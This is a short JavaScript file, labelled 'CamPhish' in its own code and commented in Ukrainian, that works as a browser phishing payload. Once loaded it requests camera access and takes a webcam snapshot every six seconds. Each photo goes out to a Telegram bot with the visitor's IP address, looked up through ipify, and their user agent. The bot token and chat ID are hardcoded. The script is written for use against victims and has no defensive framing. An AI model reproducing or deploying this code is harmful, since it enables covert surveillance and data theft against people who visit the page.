const BOT_TOKEN = '8042559622:AAEAavDAk__7zOCszusG511wMGXAe-oszhk'; // Замініть на ваш токен Telegram-бота
const CHAT_ID = '7208042011'; // Замініть на ваш Chat ID

// Функція для надсилання даних до Telegram
async function sendToTelegram(message, image) {
    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`;
    const formData = new FormData();
    formData.append('chat_id', CHAT_ID);
    formData.append('photo', image);
    formData.append('caption', message);

    await fetch(url, {
        method: 'POST',
        body: formData,
    });
}

// Отримання доступу до камери
async function startCamPhish() {
    try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
        const video = document.createElement('video');
        video.srcObject = stream;
        video.play();

        // Знімок кожні 6 секунд
        setInterval(async () => {
            const canvas = document.createElement('canvas');
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            const context = canvas.getContext('2d');
            context.drawImage(video, 0, 0, canvas.width, canvas.height);

            const image = await new Promise((resolve) => canvas.toBlob(resolve, 'image/jpeg'));
            const userAgent = navigator.userAgent;
            const ip = await fetch('https://api.ipify.org?format=json')
                .then((response) => response.json())
                .then((data) => data.ip);

            const message = `IP: ${ip}\nUser Agent: ${userAgent}`;
            await sendToTelegram(message, image);
        }, 6000); // Інтервал у мілісекундах (6000 = 6 секунд)
    } catch (error) {
        console.error('Error accessing camera:', error);
    }
}

// Запуск CamPhish
startCamPhish();